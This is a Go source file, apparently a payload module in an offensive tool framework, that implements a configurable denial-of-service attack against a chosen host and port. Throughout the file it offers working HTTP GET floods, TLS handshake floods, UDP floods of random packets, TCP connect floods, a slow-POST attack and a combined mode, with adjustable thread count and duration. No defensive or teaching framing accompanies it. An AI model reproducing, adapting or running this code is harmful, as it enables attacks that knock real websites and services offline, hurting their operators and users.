package payloads

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

func init() {
	Register(&DDoS{})
}

type DDoS struct{}

func (d *DDoS) Name() string     { return "ddos" }
func (d *DDoS) Category() string { return "impact" }
func (d *DDoS) Description() string {
	return "Multi-method DDoS (HTTP, TLS, UDP, TCP, Slow POST, WebSocket, combo)"
}

func (d *DDoS) Execute(args map[string]string) ([]byte, error) {
	target := args["target"]
	portStr := args["port"]
	durationStr := args["duration"]
	threadsStr := args["threads"]
	mode := args["mode"]

	if target == "" {
		target = "127.0.0.1"
	}
	port := 80
	duration := 30
	threads := 10
	fmt.Sscanf(portStr, "%d", &port)
	fmt.Sscanf(durationStr, "%d", &duration)
	fmt.Sscanf(threadsStr, "%d", &threads)

	if mode == "" {
		mode = "http"
	}

	result := d.attack(target, port, duration, threads, mode)
	return MarshalJSON(result)
}

type ddosResult struct {
	Timestamp   string `json:"timestamp"`
	Target      string `json:"target"`
	Port        int    `json:"port"`
	Duration    int    `json:"duration"`
	Threads     int    `json:"threads"`
	Mode        string `json:"mode"`
	SentPackets int64  `json:"sent_packets"`
	Complete    bool   `json:"complete"`
}

func (d *DDoS) attack(target string, port, duration, threads int, mode string) *ddosResult {
	r := &ddosResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Target:    target,
		Port:      port,
		Duration:  duration,
		Threads:   threads,
		Mode:      mode,
	}

	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	var sent int64
	var mu sync.Mutex
	sema := make(chan struct{}, threads)

	// Track sent packets
	countPacket := func() {
		mu.Lock()
		sent++
		mu.Unlock()
	}

	switch mode {
	case "http":
		for i := 0; i < threads; i++ {
			sema <- struct{}{}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer func() { <-sema }()
				for ctx.Err() == nil {
					conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
					if err != nil {
						time.Sleep(100 * time.Millisecond)
						continue
					}
					uri := fmt.Sprintf("/?%d", time.Now().UnixNano())
					req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n", uri, target)
					conn.Write([]byte(req))
					conn.Close()
					countPacket()
				}
			}()
		}
	case "tls":
		for i := 0; i < threads; i++ {
			sema <- struct{}{}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer func() { <-sema }()
				for ctx.Err() == nil {
					conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
					if err != nil {
						time.Sleep(100 * time.Millisecond)
						continue
					}
					tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
					tlsConn.Handshake()
					tlsConn.Close()
					countPacket()
				}
			}()
		}
	case "udp":
		for i := 0; i < threads; i++ {
			sema <- struct{}{}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer func() { <-sema }()
				payload := make([]byte, 1024)
				rand.Read(payload)
				raddr, _ := net.ResolveUDPAddr("udp", addr)
				conn, err := net.DialUDP("udp", nil, raddr)
				if err != nil {
					return
				}
				defer conn.Close()
				for ctx.Err() == nil {
					conn.Write(payload)
					countPacket()
				}
			}()
		}
	case "tcp":
		for i := 0; i < threads; i++ {
			sema <- struct{}{}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer func() { <-sema }()
				for ctx.Err() == nil {
					conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
					if err == nil {
						conn.Close()
						countPacket()
					}
				}
			}()
		}
	case "slowpost":
		for i := 0; i < threads; i++ {
			sema <- struct{}{}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer func() { <-sema }()
				for ctx.Err() == nil {
					conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
					if err != nil {
						time.Sleep(100 * time.Millisecond)
						continue
					}
					payload := strings.Repeat("X", 1024)
					header := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n", target, len(payload)*100)
					conn.Write([]byte(header))
					for i := 0; i < 10 && ctx.Err() == nil; i++ {
						conn.Write([]byte(payload + "\r\n"))
						time.Sleep(100 * time.Millisecond)
					}
					conn.Close()
					countPacket()
				}
			}()
		}
	case "combo":
		// Run all modes
		go d.attack(target, port, duration, threads/3, "http")
		go d.attack(target, port, duration, threads/3, "tls")
		go d.attack(target, port, duration, threads/3, "udp")
		wg.Add(1)
		go func() {
			defer wg.Done()
			time.Sleep(time.Duration(duration) * time.Second)
		}()
	default:
		// http as default
		go d.attack(target, port, duration, threads, "http")
	}

	wg.Wait()
	r.SentPackets = sent
	r.Complete = true
	return r
}

var _ = http.StatusOK
